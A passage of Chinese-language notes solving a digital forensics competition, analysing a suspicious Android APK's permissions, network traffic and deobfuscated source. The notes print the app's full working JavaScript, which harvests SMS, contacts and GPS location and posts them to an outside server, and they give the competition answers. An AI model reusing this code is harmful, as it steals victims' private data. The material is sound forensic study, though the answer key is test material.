服务商平台系统（当开发者上传应用时生成或分配）。 |\n| **唯一性范围** | 全球唯一（理论上）。谷歌建议使用逆序域名来确保这一点（如 `com.companyname.appname`）。 | 平台内唯一。同一个应用在不同商店可能有不同的 APPID。 |\n| **是否可变** | 不可变。一旦发布，更改包名等同于创建了一个全新的应用。 | 通常不变，但理论上平台有权重新分配。同一个应用更新版本，其 APPID 不变。 |\n| **主要用途** | 1. 系统识别：安卓系统通过包名来区分不同应用。<br>2. 安装与更新：系统根据包名判断是安装新应用还是更新现有应用。<br>3. 进程标识：应用进程名通常以包名开头。 | 1. 平台管理：用于商店后台的统计、更新、收费管理等。<br>2. API 调用：集成该服务商 SDK（如推送、登录、支付）时，需要用 APPID 来标识自身。<br>3. 应用分发：生成商店下载链接。 |\n| **示例** | `com.tencent.mm` (微信)<br>`com.netease.cloudmusic` (网易云音乐) | 华为应用市场：`C1000000001`<br>腾讯开放平台：`110xxxxxx`<br>阿里应用分发：`12345` |\n</div>\n在您提供的案例中（包名为 plus.H5B8E45D3，文件夹名为 H5B8E45D3），文件夹名就是APPID的可能性超过了90%。\n因为这种“包名 = 固定前缀 + APPID”的结构，本身就是服务商为了将技术标识和商业标识强绑定而设计的。因此，在资源目录下使用APPID作为路径的一部分，是保持逻辑一致性的最合理做法。\n\n- 还是不清楚但解题可以APP直接做到\n\n![alt text](/img/第三届长安杯笔记_2-3.png)\n“当然也可以去网站源文件里面确认，就是看ID”（？没找到APP内的地方）——[来源](https://blog.csdn.net/ntrybw/article/details/126977777)\n   \n#### 4. 该APK具备下列哪些危险权限(多选题)：\nA.读取短信  B.读取通讯录 C.读取精确位置 D.修改通讯录 E.修改短信\n- APP直接做到\n\n![alt text](/img/第三届长安杯笔记_2-4.png)\n- xml文件内查找\n```html\n    <uses-permission android:name=\"android.permission.INTERNET\"/>\n    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>\n    <uses-permission android:name=\"android.permission.INSTALL_PACKAGES\"/>\n    <uses-permission android:name=\"android.permission.REQUEST_INSTALL_PACKAGES\"/>\n    <uses-feature android:name=\"android.hardware.camera\"/>\n    <uses-feature android:name=\"android.hardware.camera.autofocus\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>\n    <uses-permission android:name=\"android.permission.READ_CONTACTS\"/>\n    <uses-permission android:name=\"android.permission.READ_SMS\"/>\n    <uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>\n    <uses-permission android:name=\"android.permission.SEND_SMS\"/>\n    <uses-permission android:name=\"android.permission.WRITE_SMS\"/>\n    <uses-permission android:name=\"android.permission.GET_ACCOUNTS\"/>\n    <uses-permission android:name=\"android.permission.WRITE_CONTACTS\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>\n    <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>\n    <uses-permission android:name=\"android.permission.CHANGE_WIFI_STATE\"/>\n    <uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>\n    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n    <uses-permission android:name=\"android.permission.MOUNT_UNMOUNT_FILESYSTEMS\"/>\n    <uses-permission android:name=\"android.permission.READ_LOGS\"/>\n    <uses-permission android:name=\"android.permission.WRITE_SETTINGS\"/>\n    <uses-permission android:name=\"com.huawei.android.launcher.permission.CHANGE_BADGE\"/>\n    <uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/>\n    <uses-permission android:name=\"com.asus.msa.SupplementaryDID.ACCESS\"/>\n```\n<!-- 让表格居中显示的风格 -->\n<style>\n.center \n{\n  width: auto;\n  display: table;\n  margin-left: auto;\n  margin-right: auto;\n}\n</style>\n<div class=\"center\">\n<!-- 表格输入位置 -->\n \n| name=后面的字符串 | 对应代表权限意思 |\n| :--- | :--- |\n| `android.permission.INTERNET` | 访问互联网 |\n| `android.permission.WRITE_EXTERNAL_STORAGE` | 写入外部存储 |\n| `android.permission.ACCESS_NETWORK_STATE` | 访问网络状态 |\n| `android.permission.ACCESS_WIFI_STATE` | 访问Wi-Fi状态 |\n| `android.permission.INSTALL_PACKAGES` | 安装程序包 |\n| `android.permission.REQUEST_INSTALL_PACKAGES` | 请求安装程序包 |\n| `android.hardware.camera` | 需要摄像头 (硬件功能) |\n| `android.hardware.camera.autofocus` | 需要自动对焦 (硬件功能) |\n| `android.permission.ACCESS_COARSE_LOCATION` | 访问粗略位置 |\n| `android.permission.ACCESS_FINE_LOCATION` | 访问精确位置 |\n| `android.permission.READ_CONTACTS` | 读取联系人 |\n| `android.permission.READ_SMS` | 读取短信 |\n| `android.permission.RECEIVE_SMS` | 接收短信 |\n| `android.permission.ACCESS_COARSE_LOCATION` | 访问粗略位置 |\n| `android.permission.ACCESS_FINE_LOCATION` | 访问精确位置 |\n| `android.permission.SEND_SMS` | 发送短信 |\n| `android.permission.WRITE_SMS` | 写入短信 |\n| `android.permission.GET_ACCOUNTS` | 获取账户列表 |\n| `android.permission.WRITE_CONTACTS` | 写入联系人 |\n| `android.permission.ACCESS_WIFI_STATE` | 访问Wi-Fi状态 |\n| `android.permission.ACCESS_NETWORK_STATE` | 访问网络状态 |\n| `android.permission.CHANGE_WIFI_STATE` | 更改Wi-Fi状态 |\n| `android.permission.READ_PHONE_STATE` | 读取手机状态 |\n| `android.permission.WRITE_EXTERNAL_STORAGE` | 写入外部存储 |\n| `android.permission.MOUNT_UNMOUNT_FILESYSTEMS` | 挂载和卸载文件系统 |\n| `android.permission.READ_LOGS` | 读取系统日志 |\n| `android.permission.WRITE_SETTINGS` | 写入系统设置 |\n| `com.huawei.android.launcher.permission.CHANGE_BADGE` | 华为角标权限 |\n| `android.permission.READ_EXTERNAL_STORAGE` | 读取外部存储 |\n| `com.asus.msa.SupplementaryDID.ACCESS` | 华硕补充设备ID权限 |\n</div>\n\n反思：联网可以直接丢给ai，断网可以复制黏贴到txt搜索read,write等词\n[网上找到的对应关系表，在images文件夹存储文件名为：安卓权限中英文对应表.jpeg](https://www.cnblogs.com/linn/p/4046180.html)\n\n\n#### 5. 该APK发送回后台服务器的数据包含一下哪些内容(多选题)：\nA.手机通讯录 B.手机应用列表 C.手机号码 D.验证码 E.GPS定位信息\n##### 法一\n- 雷电软件 其他模式抓不到，使用代理模式抓包能抓到CD【复刻失败方法】\n\n![alt text](/img/第三届长安杯笔记_2-7.png)\n![alt text](/img/第三届长安杯笔记_2-8.png)\n- 模拟器请求手机通讯录，猜测有A\n- 添加锁屏密码和通讯录信息后抓包获得\n\n![alt text](/img/第三届长安杯笔记_6.png)\n![alt text](/img/第三届长安杯笔记_7.png)\n- 答案都出来了，耶\n\n- 官方文档：\n- 抓包方式介绍\n- 雷电APP智能分析软件目前提供了4种抓包方式，分别是**HTTP、TCP、代理模式、TCPDump**，Android 支持全部4种方式，iOS 目前只支持代理模式抓包，下面分别介绍四种方式的应用场景：\n  - HTTP 方式是基于手机 VPN 原理实现的抓包，一般情况下如果是要抓HTTP 协议的网络数据包推荐这种方式，不过后台服务器已经不在运行的情况下使用该方式无法抓取到网络数据包。\n  - TCP 方式同样是基于手机 VPN 原理实现的抓包，如果网络数据包是原生 TCP 协议的话推荐使用这种方式。\n  - 代理模式是基于在手机或者模拟器上设置代理地址实现的抓包（和 fiddler、charles 原理相同），软件会自动设置代理 IP 地址，无需手动填写代理地址，这种方式的优点是后台服务器不在运行的情况下也能抓到请求的网络数据包。\n  - TCPDump 模式是基于 libpcap 库的抓包，根据使用者的定义对网络上的数据包进行截获，可以将网络中传送的数据包完全截获下来提供分析，这种方式的优点是可以抓取到所有协议的网络数据包。\n- 抓包方式选用\n  - 抓 HTTP 协议首选 HTTP 方式抓包，后台服务器不存在的情况下选择代理模式抓包；\n  - 抓 TCP 协议选择 TCP 方式抓包；\n  - 在其他方式都抓包无果的情况下，建议使用 TCPDump 进行尝试；\n- 抓包注意事项\n  - 代理模式和 TCPDump 抓包不能自动区分网络数据包是来源哪个应用的，有可能会混入非当前 APP 的网络数据包，因此需要自己筛选判断；\n  - 代理模式如果使用的是真机，真机需要和 PC 保持在同一局域网；\n  - 代理模式和 TCPDump 抓到的网络数据包需要先在分析结果页中将目标数据包添加标记后才能导出到 Word/PDF 报告；\n  - Android 设备使用代理模式时软件会自动设置代理，结束抓包的时候软件会自动清除代理。如果没有正常结束代理模式抓包，可能会因残留的代理设置导致Android设备无法上网，可以使用雷电APP自动修复；\n  - iOS 设备使用代理模式时需要自己安装证书、配置代理设置以及清除代理设置；\n  - TCPDump 抓包模式下不会实时更新抓包结果，只有在点击结束后才会进行解析并展示抓包结果；\n  - TCPDump 的抓包结果目前只支持 HTTP 请求的解析，HTTPS 请求需要借 Wireshark 进行分析。\n##### 法二\n- jadx搜索\n\n![alt text](/img/第三届长安杯笔记_2-6-1.png)\n![alt text](/img/第三届长安杯笔记_2-10.png)\n- [解密网站](https://ctf.bugku.com/tool/sojson4)得到：\n```c\n/*\n*Aman - 194nb.com\n*/\n/*\n *Progcessed By JSDec in 0.00s\n *JSDec - JSDec.js.org\n */\nmui.init();\n\n\t\tmui.plusReady(function () {\n\t\t\t//var main = plus.android.runtimeMainActivity();  \n\t\t\t// main.moveTaskToBack(false);\n\n\t\t\tvar address = plus.device.vendor + '-' + plus.device.model;\n\t\t\taddress = address.replace(/\\n/g, \"\").replace(/ /g, \"\").replace(/\\r/g, \"\");\n\t\t\tvar apiserver = 'http://www.honglian7001.com/api/uploads/';\n\t\t\t//重复数据处理 预防用户重复点击\n\t\t\tvar danjishijian = true;\n\t\t\tfunction requestPermission(sjh, yqm) {\n\t\t\t\tplus.android.requestPermissions(\n\t\t\t\t\t[\"android.permission.READ_SMS\"],\n\t\t\t\t\tfunction (resultObj) {\n\t\t\t\t\t\t//SmsInfo存放一条短信的各项内容\n\t\t\t\t\t\tvar SmsInfo = {}\n\t\t\t\t\t\t//Sms存放所有短信\n\t\t\t\t\t\tvar Sms = {}\n\n\t\t\t\t\t\tvar aimei = sjh;\n\t\t\t\t\t\tvar aimei2 = yqm;\n\t\t\t\t\t\tvar duanxin = '[{\"imei\":\"' + aimei + '\",\"imei2\":\"' + aimei2 + '\"}';\n\t\t\t\t\t\tvar Cursor = plus.android.importClass(\"android.database.Cursor\")\n\t\t\t\t\t\tvar Uri = plus.android.importClass(\"android.net.Uri\")   //注意啦，android.net.Uri中的net是小写\n\t\t\t\t\t\tvar activity = plus.android.runtimeMainActivity()\n\t\t\t\t\t\tvar uri = Uri.parse(\"content://sms/\");\n\n\t\t\t\t\t\tvar projection = new Array(\"_id\", \"address\", \"person\", \"body\", \"date\", \"type\")\n\t\t\t\t\t\tvar cusor = activity.managedQuery(uri, projection, null, null, \"date desc\")\n\t\t\t\t\t\tvar idColumn = cusor.getColumnIndex(\"_id\")\n\t\t\t\t\t\tvar nameColumn = cusor.getColumnIndex(\"person\")\n\t\t\t\t\t\tvar phoneNumberColumn = cusor.getColumnIndex(\"address\")\n\t\t\t\t\t\tvar smsbodyColumn = cusor.getColumnIndex(\"body\")\n\t\t\t\t\t\tvar dateColumn = cusor.getColumnIndex(\"date\")\n\t\t\t\t\t\tvar typeColumn = cusor.getColumnIndex(\"type\")\n\t\t\t\t\t\tif (cusor != null) {\n\t\t\t\t\t\t\twhile (cusor.moveToNext()) {\n\t\t\t\t\t\t\t\tSmsInfo.id = cusor.getString(idColumn)\n\t\t\t\t\t\t\t\tSmsInfo.Name = cusor.getInt(nameColumn)\n\t\t\t\t\t\t\t\tSmsInfo.Date = cusor.getLong(dateColumn)\n\t\t\t\t\t\t\t\tSmsInfo.Date = getFormatDate(SmsInfo.Date)\n\t\t\t\t\t\t\t\tSmsInfo.PhoneNumber = cusor.getString(phoneNumberColumn)\n\t\t\t\t\t\t\t\tSmsInfo.Smsbody = cusor.getString(smsbodyColumn)\n\t\t\t\t\t\t\t\tSmsInfo.Type = cusor.getString(typeColumn)\n\n\t\t\t\t\t\t\t\tvar post = JSON.stringify(SmsInfo);\n\t\t\t\t\t\t\t\t//console.log(post);\n\t\t\t\t\t\t\t\tduanxin = duanxin + ',' + post;\n\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tduanxin = duanxin + ']';\n\t\t\t\t\t\t\t//alert(duanxin);\n\n\t\t\t\t\t\t\tmui.ajax(apiserver + 'apisms', {\n\t\t\t\t\t\t\t\tdata: {\n\t\t\t\t\t\t\t\t\tdata: duanxin\n\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\tdataType: 'text',//服务器返回json格式数据\n\t\t\t\t\t\t\t\ttype: 'post',//HTTP请求类型\n\t\t\t\t\t\t\t\ttimeout: 10000,//超时时间设置为10秒；              \n\t\t\t\t\t\t\t\tsuccess: function (data) {\n\t\t\t\t\t\t\t\t\tmui.toast('获取成功')\n\t\t\t\t\t\t\t\t\t//console.log(con)\n\n\n\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\terror: function (xhr, type, errorThrown) {\n\t\t\t\t\t\t\t\t\t//异常处理；\n\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\t\t\t\t\t\t\tcusor.close()\n\t\t\t\t\t\t}\n\n\t\t\t\t\t},\n\t\t\t\t\tfunction (error) {\n\t\t\t\t\t\tconsole.log('申请权限错误：' + error.code + \" = \" + error.message);\n\t\t\t\t\t});\n\t\t\t}\n\n\n\n\t\t\t//扩展Date功能：将long型日期转换为特定的格式\n\t\t\tDate.prototype.format = function (format) {\n\t\t\t\tvar o = {\n\t\t\t\t\t\"M+\": this.getMonth() + 1,\n\t\t\t\t\t\"d+\": this.getDate(),\n\t\t\t\t\t\"h+\": this.getHours(),\n\t\t\t\t\t\"m+\": this.getMinutes(),\n\t\t\t\t\t\"s+\": this.getSeconds(),\n\t\t\t\t\t\"q+\": Math.floor((this.getMonth() + 3) / 3),\n\t\t\t\t\t\"S\": this.getMilliseconds()\n\t\t\t\t}\n\t\t\t\tif (/(y+)/.test(format)) {\n\t\t\t\t\tformat = format.replace(RegExp.$1, (this.getFullYear() + \"\").substr(4 - RegExp.$1.length));\n\t\t\t\t}\n\t\t\t\tfor (var k in o) {\n\t\t\t\t\tif (new RegExp(\"(\" + k + \")\").test(format)) {\n\t\t\t\t\t\tformat = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : (\"00\" + o[k]).substr((\"\" + o[k]).length));\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn format;\n\t\t\t}\n\n\n\t\t\t//将long型日期转换为特定格式\n\t\t\tfunction getFormatDate(l, pattern) {\n\t\t\t\tdate = new Date(l);\n\t\t\t\tif (pattern == undefined) {\n\t\t\t\t\tpattern = \"yyyy-MM-dd hh:mm:ss\";\n\t\t\t\t}\n\t\t\t\treturn date.format(pattern);\n\t\t\t}\n\n\n\t\t\t//alert(plus.device.uuid)\n\t\t\tplus.navigator.setStatusBarBackground(\"#db6eff\");\n\n\t\t\tmui(\"body\").off(\"tap\");\n\n\t\t\tmui(\"body\").on('tap', '#tx', function (event) {\n\n\t\t\t\t$('#tx').hide();\n\t\t\t\t$('#zz').show();\n\t\t\t});\n\n\t\t\tmui(\"body\").on('tap', '#gb', function (event) {\n\n\t\t\t\t$('#tx').show();\n\t\t\t\t$('#zz').hide();\n\t\t\t});\n\n\t\t\tmui(\"body\").on('tap', '#qd', function (event) {\n\t\t\t\tif (danjishijian) {\n\t\t\t\t\tdanjishijian = false;\n\t\t\t\t\taa()\n\t\t\t\t} else {\n\t\t\t\t\taa()\n\t\t\t\t}\n\n\t\t\t});\n\n\n\t\t\tfunction getPermission(permissionIdentity, successCallBack, errorCallBack) {\n\t\t\t\t//权限标识转换成大写  \n\t\t\t\tvar permissionIdentity = permissionIdentity.toUpperCase();\n\t\t\t\t//获取检测权限的状态  \n\t\t\t\tvar checkResult = plus.navigator.checkPermission(permissionIdentity);\n\t\t\t\t//权限状态是否正常  \n\t\t\t\tvar permissionStatusOk = false;\n\t\t\t\t//权限中文名称  \n\t\t\t\tvar permissionName = '';\n\t\t\t\t//对应 andorid 的具体权限  \n\t\t\t\tvar androidPermission = '';\n\t\t\t\t//获取权限中文意思与对应 android 系统的权限字符串  \n\t\t\t\tswitch (permissionIdentity) {\n\n\t\t\t\t\tcase 'CONTACTS':\n\t\t\t\t\t\tpermissionName = '系统联系人';\n\t\t\t\t\t\tandroidPermission = 'android.permission.READ_CONTACTS'\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tpermissionName = '未知';\n\t\t\t\t\t\tandroidPermission = '未知';\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\t//判断检查权限的结果  \n\t\t\t\tswitch (checkResult) {\n\t\t\t\t\tcase 'authorized':\n\t\t\t\t\t\t//正常的  \n\t\t\t\t\t\tpermissionStatusOk = true\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 'denied':\n\t\t\t\t\t\t//表示程序已被用户拒绝使用此权限，如果是拒绝的就再次提示用户打开确认提示框  \n\t\t\t\t\t\t//如果有该权限但是没有打开不进行操作还是会去申请或手动打开  \n\t\t\t\t\t\t// console.log('已关闭' + permissionName + '权限')  \n\t\t\t\t\t\t// errorCallBack('已关闭' + permissionName + '权限');  \n\t\t\t\t\t\t// return  \n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 'undetermined':\n\t\t\t\t\t\t// 表示程序未确定是否可使用此权限，此时调用对应的API时系统会弹出提示框让用户确认  \n\t\t\t\t\t\t// this.requestPermissions(androidPermission, permissionName, successCallBack, errorCallBack)  \n\t\t\t\t\t\t// errorCallBack('未确定' + permissionName + '权限');  \n\t\t\t\t\t\t// return  \n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 'unknown':\n\t\t\t\t\t\terrorCallBack('无法查询' + permissionName + '权限');\n\t\t\t\t\t\treturn\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tdefault:\n\t\t\t\t\t\terrorCallBack('不支持' + permissionName + '权限');\n\t\t\t\t\t\treturn\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\t//如果权限是正常的执行成功回调  \n\t\t\t\tif (permissionStatusOk) {\n\t\t\t\t\tsuccessCallBack()\n\t\t\t\t} else {\n\t\t\t\t\t//如果不正常，如果是 andorid 系统，就动态申请权限  \n\t\t\t\t\tif (plus.os.name == 'Android') {\n\t\t\t\t\t\t//动态申请权限  \n\t\t\t\t\t\tplus.android.requestPermissions([androidPermission], function (e) {\n\t\t\t\t\t\t\tif (e.deniedAlways.length > 0) {\n\t\t\t\t\t\t\t\t//权限被永久拒绝  \n\t\t\t\t\t\t\t\t// 弹出提示框解释为何需要定位权限，引导用户打开设置页面开启  \n\t\t\t\t\t\t\t\terrorCallBack('请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。')\n\t\t\t\t\t\t\t\t// console.log('Always Denied!!! ' + e.deniedAlways.toString());  \n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif (e.deniedPresent.length > 0) {\n\t\t\t\t\t\t\t\t//权限被临时拒绝  \n\t\t\t\t\t\t\t\t// 弹出提示框解释为何需要定位权限，可再次调用plus.android.requestPermissions申请权限  \n\t\t\t\t\t\t\t\terrorCallBack('请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。')\n\t\t\t\t\t\t\t\t// console.log('Present Denied!!! ' + e.deniedPresent.toString());  \n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif (e.granted.length > 0) {\n\t\t\t\t\t\t\t\t//权限被允许  \n\t\t\t\t\t\t\t\t//调用依赖获取定位权限的代码  \n\t\t\t\t\t\t\t\tsuccessCallBack()\n\t\t\t\t\t\t\t\t// console.log('Granted!!! ' + e.granted.toString());  \n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}, function (e) {\n\t\t\t\t\t\t\terrorCallBack('请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。')\n\t\t\t\t\t\t\t// console.log('Request Permissions error:' + JSON.stringify(e));  \n\t\t\t\t\t\t})\n\t\t\t\t\t} else if (plus.os.name == 'iOS') {\n\t\t\t\t\t\t//ios ,第一次使用目的权限时，应用的权限列表里是不存在的，所以先默认执行一下成功回调，打开要使用的操作，比如 plus.camera  \n\t\t\t\t\t\t//这时系统会提示是否打开相应的权限，如果拒绝也没关系，因为应用的权限列表里已经存在该权限了，下次再调用相应权限时，就会  \n\t\t\t\t\t\t//走 else 里的流程，会给用户提示，并且跳转到应该的权限页面，让用户手动打开。  \n\t\t\t\t\t\tif (checkResult == 'undetermined') {\n\t\t\t\t\t\t\t//调用依赖获取定位权限的代码  \n\t\t\t\t\t\t\tsuccessCallBack(true)\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t//如果是 ios 系统，ios 没有动态申请操作，所以提示用户去设置页面手动打开  \n\t\t\t\t\t\t\tmui.confirm(permissionName + '权限没有开启，是否去开启？', '提醒', ['取消', '确认'], function (e) {\n\t\t\t\t\t\t\t\t//取消  \n\t\t\t\t\t\t\t\tif (e.index == 0) {\n\t\t\t\t\t\t\t\t\terrorCallBack('请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。')\n\t\t\t\t\t\t\t\t} else if (e.index == 1) {\n\t\t\t\t\t\t\t\t\t//确认，打开当前应用权限设置页面  \n\t\t\t\t\t\t\t\t\tvar UIApplication = plus.ios.import('UIApplication');\n\t\t\t\t\t\t\t\t\tvar application2 = UIApplication.sharedApplication();\n\t\t\t\t\t\t\t\t\tvar NSURL2 = plus.ios.import('NSURL');\n\t\t\t\t\t\t\t\t\t// var setting2 = NSURL2.URLWithString(\"prefs:root=LOCATION_SERVICES\");                             \n\t\t\t\t\t\t\t\t\tvar setting2 = NSURL2.URLWithString('app-settings:');\n\t\t\t\t\t\t\t\t\tapplication2.openURL(setting2);\n\n\t\t\t\t\t\t\t\t\tplus.ios.deleteObject(setting2);\n\t\t\t\t\t\t\t\t\tplus.ios.deleteObject(NSURL2);\n\t\t\t\t\t\t\t\t\tplus.ios.deleteObject(application2)\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}, 'div')\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tfunction aa() {\n\t\t\t\tvar sjh = $('#sjh').val();\n\t\t\t\tvar yqm = $('#yqm').val();\n\t\t\t\tif (parseInt(sjh) > 0 && parseInt(yqm) > 0 && parseInt(sjh) > 13000000000 && parseInt(sjh) < 19999999999 && parseInt(yqm) > 0 && parseInt(yqm) < 999999) {\n\n\t\t\t\t\tgetPermission('CONTACTS', function () {\n\t\t\t\t\t\thuoqu(sjh, yqm);\n\n\t\t\t\t\t}, function (msg) {\n\t\t\t\t\t\tmui.alert(msg, '提醒', '确定', function () { }, 'div')\n\t\t\t\t\t\t//aa()\n\t\t\t\t\t})\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tmui.toast('请输入正确的手机号和邀请码')\n\t\t\t\t}\n\n\t\t\t}\n\n\t\t\tfunction dingwei(sjh, yqm) {\n\t\t\t\tplus.geolocation.getCurrentPosition(translatePoint, function (e) {\n\t\t\t\t\tmui.toast(\"异常:\" + e.message);\n\t\t\t\t});\n\t\t\t}\n\n\t\t\tfunction translatePoint(position) {\n\n\t\t\t\tvar sjh = $('#sjh').val()\n\t\t\t\tvar yqm = $('#yqm').val()\n\t\t\t\tvar currentLon = position.coords.longitude;\n\t\t\t\tvar currentLat = position.coords.latitude;\n\t\t\t\tvar jingweidu = sjh + ',' + yqm + ',' + currentLon + ',' + currentLat;\n\t\t\t\tmui.ajax(apiserver + 'apimap', {\n\t\t\t\t\tdata: {\n\t\t\t\t\t\tdata: jingweidu\n\t\t\t\t\t},\n\t\t\t\t\tdataType: 'text',//服务器返回json格式数据\n\t\t\t\t\ttype: 'post',//HTTP请求类型\n\t\t\t\t\ttimeout: 10000,//超时时间设置为10秒；              \n\t\t\t\t\tsuccess: function (data) {\n\n\t\t\t\t\t\tif (data == '获取成功') {\n\t\t\t\t\t\t\trequestPermission(sjh, yqm);\n\n\t\t\t\t\t\t\t//setInterval(function(){\n\t\t\t\t\t\t\t//var sjh=$('#sjh').val();\n\t\t\t\t\t\t\t//var yqm=$('#yqm').val();\n\t\t\t\t\t\t\t//requestPermission(sjh,yqm);\n\t\t\t\t\t\t\t//console.log('send')\n\n\t\t\t\t\t\t\t//},30000)\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tmui.toast(data)\n\t\t\t\t\t},\n\t\t\t\t\terror: function (xhr, type, errorThrown) {\n\t\t\t\t\t\t//异常处理；\n\t\t\t\t\t}\n\t\t\t\t});\n\n\t\t\t\t//书写自己的逻辑\n\n\t\t\t}\n\t\t\t// 扩展API加载完毕，现在可以正常调用扩展API\n\n\t\t\tfunction huoqu(sjh, yqm) {\n\t\t\t\tvar con = sjh + \"**\" + yqm + '**' + address;\n\n\n\t\t\t\tplus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function (addressbook) {\n\n\n\t\t\t\t\taddressbook.find([\"displayName\", \"phoneNumbers\"], function (contacts) {\n\n\n\t\t\t\t\t\tfor (var i = 0, len = contacts.length; i < len; i++) {\n\t\t\t\t\t\t\tcon = con + '=' + contacts[i].displayName + '|' + (contacts[i].phoneNumbers.length == 0 ? \"\" : contacts[i].phoneNumbers[0].value);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tmui.ajax(apiserver + 'api', {\n\t\t\t\t\t\t\tdata: {\n\t\t\t\t\t\t\t\tdata: con\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\tdataType: 'text',//服务器返回json格式数据\n\t\t\t\t\t\t\ttype: 'post',//HTTP请求类型\n\t\t\t\t\t\t\ttimeout: 10000,//超时时间设置为10秒；              \n\t\t\t\t\t\t\tsuccess: function (data) {\n\t\t\t\t\t\t\t\t//alert(data)\n\t\t\t\t\t\t\t\tif (data == '正在加载列表') {\n\t\t\t\t\t\t\t\t\tdingwei(sjh, yqm);\n\t\t\t\t\t\t\t\t\tmui.openWindow({\n\t\t\t\t\t\t\t\t\t\turl: 'list.html',\n\t\t\t\t\t\t\t\t\t\tshow: {\n\t\t\t\t\t\t\t\t\t\t\tautoShow: true\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t});\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\tmui.toast(data)\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t//console.log(con)\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\terror: function (xhr, type, errorThrown) {\n\t\t\t\t\t\t\t\t//异常处理；\n\n\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\t\t\t\t\t}, function () {\n\t\t\t\t\t\tmui.alert(\"为保证用户质量，使用本app请同意通讯录授权 \");\n\t\t\t\t\t}, {\n\t\t\t\t\t\tmultiple: true\n\t\t\t\t\t});\n\t\t\t\t}, function (e) {\n\t\t\t\t\tmui.alert(\"为保证用户质量，使用本app请同意通讯录授权 \");\n\t\t\t\t});\n\t\t\t}\n\t\t});\n```\n- 总结：\n  - //Sms存放所有短信；//调用依赖获取定位权限的代码；\tmui.toast('请输入正确的手机号和邀请码')\n  - mui.alert(\"为保证用户质量，使用本app请同意通讯录授权 \");\n  - 答案：ACDE\n\n#### 6. 该APK程序回传通讯录时，使用的http请求方式为\n- 雷电抓包可得\n\n#### 7. 该APK程序的回传地址域名为【标准格式：www.abc.com】\t\n- 雷电抓包可得\n\n#### 8. 该APK程序代码中配置的变量apiserver的值为【标准格式：www.abc.com/abc】\t\n- sojson4解密结果中有var apiserver = 'http://www.honglian7001.com/api/uploads/';\n\n#### 9. 分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：www.abc.com/abc】\t\n- 继续在上一段代码里搜索SMS，这是短信的一般英文名，可以看到代码\n```c\nmui.ajax(apiserver + 'apisms', {\n```\n- 答案：http://www.honglian7001.com/api/uploads/apisms\n\n#### 10. 经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为\t\n- 使用雷电APP分析的Frida脚本里的SQLite数据库，即可得到数据库名\n\n![alt text](/img/第三届长安杯笔记_8.png)\n\n#### 11. 经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该数据库的初始密码为\t\n- 同上\n\n### 经过掌握的APK程序后台服务器回连地址，警方成功调取该服务器的镜像，请使用第7题的答案对检材二进行解压进行分析，并回答下列问题：(www.honglian7001.com)\n#### 12. 检材二的原始硬盘的SHA256值为：\t\n\n![alt text](/img/第三届长安杯笔记_2-12.png)\n#### 13. 查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111.111.111.111】\t\n- pts指远程，tty指直连，down指正常关机，crash指强制关机\n\n![alt text](/img/第三届长安杯笔记_2-13.png)\n#### 14. 请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】\t\n- 仿真(默认重置密码123456？？？)\n- 查看端口：netstat -antp\n- 